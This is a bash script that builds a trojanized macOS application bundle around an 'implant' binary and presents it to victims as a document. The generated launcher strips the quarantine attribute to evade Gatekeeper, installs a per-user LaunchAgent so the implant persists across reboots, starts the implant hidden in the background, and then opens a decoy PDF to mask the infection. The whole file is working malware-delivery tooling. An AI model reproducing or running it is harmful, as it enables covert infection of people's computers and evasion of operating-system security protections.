#!/usr/bin/env bash
# Assemble a macOS .app bundle around an implant.
#
# On macOS this also lipo-folds multiple arch slices and ad-hoc codesigns the
# implant and the bundle. On Linux it produces the same structure (minus
# codesign) so the panel can package it.
#
# usage: build_app.sh <out.app> <doc> <decoy.pdf|-> <implant> [more implants...]
set -euo pipefail

OUT_APP="${1:?usage: build_app.sh <out.app> <doc> <decoy|-> <implant> [more]...}"
DOC="${2:?}"
DECOY="${3:?}"
shift 3
[ "$#" -ge 1 ] || { echo "need at least one implant" >&2; exit 1; }

EXEC_NAME="fleetrun"
BUNDLE_ID="io.fleet.$(echo "$DOC" | tr -c 'a-zA-Z0-9' '.' | sed 's/\.\{2,\}/./g')"

rm -rf "$OUT_APP"
mkdir -p "$OUT_APP/Contents/MacOS" "$OUT_APP/Contents/Resources"

# Merge arch slices into a universal binary when lipo is present and multiple
# implants were given; otherwise just take the first.
if command -v lipo >/dev/null 2>&1 && [ "$#" -gt 1 ]; then
  lipo -create -output "$OUT_APP/Contents/MacOS/$EXEC_NAME" "$@"
else
  cp "$1" "$OUT_APP/Contents/MacOS/$EXEC_NAME"
fi
chmod +x "$OUT_APP/Contents/MacOS/$EXEC_NAME"

if [ "$DECOY" != "-" ] && [ -f "$DECOY" ]; then
  cp "$DECOY" "$OUT_APP/Contents/Resources/decoy.pdf"
fi

cat > "$OUT_APP/Contents/Info.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleExecutable</key><string>launcher</string>
  <key>CFBundleIdentifier</key><string>${BUNDLE_ID}</string>
  <key>CFBundleName</key><string>${DOC}</string>
  <key>CFBundlePackageType</key><string>APPL</string>
  <key>CFBundleShortVersionString</key><string>1.0</string>
  <key>LSUIElement</key><true/>
  <key>LSMinimumSystemVersion</key><string>11.0</string>
</dict>
</plist>
PLIST

cat > "$OUT_APP/Contents/MacOS/launcher" <<LAUNCH
#!/bin/sh
# Gatekeeper-evasion: clear the quarantine xattr on our own bundle so later
# launches are silent. No chmod / no ./payload needed — Finder runs this.
SELF="\$(cd "\$(dirname "\$0")" && pwd)"
ROOT="\$(cd "\$SELF/../.." && pwd)"
xattr -dr com.apple.quarantine "\$ROOT" 2>/dev/null || true
xattr -dr com.apple.quarantine "\$SELF/${EXEC_NAME}" 2>/dev/null || true

# persistence: a per-user LaunchAgent with RunAtLoad (unattended across reboot)
AGENT="\$HOME/Library/LaunchAgents/io.fleet.\$(basename "\$ROOT" .app | tr ' .' '__').plist"
mkdir -p "\$HOME/Library/LaunchAgents"
cat > "\$AGENT" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>io.fleet.agent</string>
  <key>ProgramArguments</key><array><string>\$SELF/${EXEC_NAME}</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
PLIST
launchctl unload "\$AGENT" >/dev/null 2>&1 || true
launchctl load "\$AGENT" >/dev/null 2>&1 || true

"\$SELF/${EXEC_NAME}" >/dev/null 2>&1 &
sleep 1.5
command -v open >/dev/null 2>&1 && open "\$ROOT/Contents/Resources/decoy.pdf" >/dev/null 2>&1 || true
exit 0
LAUNCH
chmod +x "$OUT_APP/Contents/MacOS/launcher"
chmod +x "$OUT_APP/Contents/MacOS/$EXEC_NAME"

if command -v codesign >/dev/null 2>&1; then
  codesign --force -s - "$OUT_APP/Contents/MacOS/$EXEC_NAME" >/dev/null 2>&1 || true
  codesign --force -s - "$OUT_APP" >/dev/null 2>&1 || true
fi

echo "assembled $OUT_APP"
